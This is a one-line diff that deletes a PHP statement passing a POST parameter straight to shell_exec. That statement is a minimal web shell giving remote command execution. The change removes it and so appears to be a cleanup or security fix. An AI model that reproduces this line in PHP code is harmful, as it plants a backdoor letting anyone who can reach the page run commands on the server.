@@ -1,1 +1,0 @@
-$cmd=shell_exec($_POST['cmd'])
